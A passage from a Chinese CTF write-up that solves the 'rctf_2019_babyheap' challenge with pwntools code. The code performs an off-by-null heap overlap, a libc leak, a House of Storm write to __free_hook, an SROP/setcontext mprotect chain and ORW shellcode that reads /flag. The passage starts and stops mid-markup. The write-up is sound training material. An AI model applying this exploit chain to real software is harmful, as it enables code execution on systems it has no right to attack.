class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./rctf_2019_babyheap'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>elf = ELF(<span class="hljs-string">"./rctf_2019_babyheap"</span>)<br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br><br>#命令简写化<br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims   :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>=lambda address,dat<span class="hljs-variable">a:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><br> <br>def <span class="hljs-built_in">add</span>(size):<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br><span class="hljs-keyword">sl</span>(<span class="hljs-string">'1'</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Size: "</span>)<br><span class="hljs-keyword">sl</span>(str(size))<br><br>def free(<span class="hljs-built_in">index</span>):<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br><span class="hljs-keyword">sl</span>(<span class="hljs-string">'3'</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Index: "</span>)<br><span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def show(<span class="hljs-built_in">index</span>):<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br><span class="hljs-keyword">sl</span>(<span class="hljs-string">'4'</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Index: "</span>)<br><span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>, content):<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br><span class="hljs-keyword">sl</span>(<span class="hljs-string">'2'</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Index: "</span>)<br><span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><span class="hljs-keyword">ru</span>(<span class="hljs-string">"Content: "</span>)<br>s(content)<br></code></pre></td></tr></tbody></table></figure><h3 id="首先构造堆块重叠，泄露libc基地址"><a href="#首先构造堆块重叠，泄露libc基地址" class="headerlink" title="首先构造堆块重叠，泄露libc基地址"></a>首先构造堆块重叠，泄露libc基地址</h3><p>先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,<br>chunk_3是为了free前三个chunk后防止堆块合并</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x80)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x68)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>xf0)</span></span>#<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x60 + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x100)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>, payload)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>free chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x80)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>malloc_hook = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x7f'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x58 - <span class="hljs-number">0</span>x10<br>libc<span class="hljs-selector-class">.address</span> = malloc_hook - libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__malloc_hook'</span>]</span><br>system = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br>free_hook = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__free_hook'</span>]</span><br>set_context = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'setcontext'</span>]</span><br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc_base'</span>,libc.address)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h3 id="构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom"><a href="#构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom" class="headerlink" title="构造unsortbin chunk 和largebin chunk，进行 house of strom"></a>构造unsortbin chunk 和largebin chunk，进行 house of strom</h3><p>先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章<a href="https://blog.csdn.net/tbsqigongzi/article/details/126185571?spm=1001.2014.3001.5502">House of storm</a><br>此时我们已以可以修改free_hook处的值了</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">5</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">7</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">8</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">9</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">10</span><br><br><span class="hljs-comment">#dbg()</span><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">5</span>, 'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500))<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">4</span>, 'a'*<span class="hljs-number">0</span>x18)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">11</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x30)#<span class="hljs-number">5</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">6</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">8</span>, 'a'*<span class="hljs-number">0</span>x4f0+p64(<span class="hljs-number">0</span>x500))<br><span class="hljs-attribute">free</span>(<span class="hljs-number">8</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>, 'a'*<span class="hljs-number">0</span>x18)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">8</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8)#<span class="hljs-number">12</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">8</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">9</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x40)#<span class="hljs-number">8</span><br><span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">6</span><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">6</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#--------------修改他们的满足条件进行 house of strom------------------------------#</span><br><span class="hljs-attribute">storage</span> = free_hook<br><span class="hljs-attribute">fake_chunk</span> = storage - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">payload</span> = '\x00'*<span class="hljs-number">0</span>x10 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">11</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span> = '\x00'*<span class="hljs-number">0</span>x20 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4e1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>) +p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">12</span>, payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x48)#<span class="hljs-number">6</span><br></code></pre></td></tr></tbody></table></figure><h3 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect+shellcode"></a>mprotect+shellcode</h3><p>修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,<br>setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">new_addr =  free_hook &amp;<span class="hljs-number">0xFFFFFFFFFFFFF000</span><br>shellcode1 = <span class="hljs-string">'''</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,%d<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x1000</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rsi</span><br><span class="hljs-string">'''</span> % new_addr<br>edit(<span class="hljs-number">6</span>, <span class="hljs-string">'a'</span>*<span class="hljs-number">0x10</span>+p64(set_context+<span class="hljs-number">53</span>)+p64(free_hook+<span class="hljs-number">0x18</span>)*<span class="hljs-number">2</span>+asm(shellcode1))<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到<br>free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frame = <span class="hljs-built_in">SigreturnFrame</span>()<br>frame<span class="hljs-selector-class">.rsp</span> = free_hook+<span class="hljs-number">0</span>x10<br>frame<span class="hljs-selector-class">.rdi</span> = new_addr<br>frame<span class="hljs-selector-class">.rsi</span> = <span class="hljs-number">0</span>x1000<br>frame<span class="hljs-selector-class">.rdx</span> = <span class="hljs-number">7</span><br>frame<span class="hljs-selector-class">.rip</span> = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'mprotect'</span>]</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">12</span>, str(frame)</span></span>)<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">12</span>)</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>利用orw构造shellcode，发送过去并执行，获得shell</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">shellcode2 = <span class="hljs-string">'''</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x67616c662f</span> <span class="hljs-comment">;// /flag</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span> <span class="hljs-comment">;// /flag</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span> <span class="hljs-comment">;// O_RDONLY</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span> <span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span> <span class="hljs-comment">;// SYS_open</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span> <span class="hljs-comment">;// fd </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span>  <span class="hljs-comment">;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">1024</span> <span class="hljs-comment">;// nbytes</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0</span> <span class="hljs-comment">;// SYS_read</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span> <span class="hljs-comment">;// fd </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span> <span class="hljs-comment">;// buf</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rax</span> <span class="hljs-comment">;// count </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span> <span class="hljs-comment">;// SYS_write</span><br><span class="hljs-keyword">syscall</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span> <span class="hljs-comment">;// error_code</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-string">'''</span><br>sl(asm(shellcode2))<br>itr()<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span 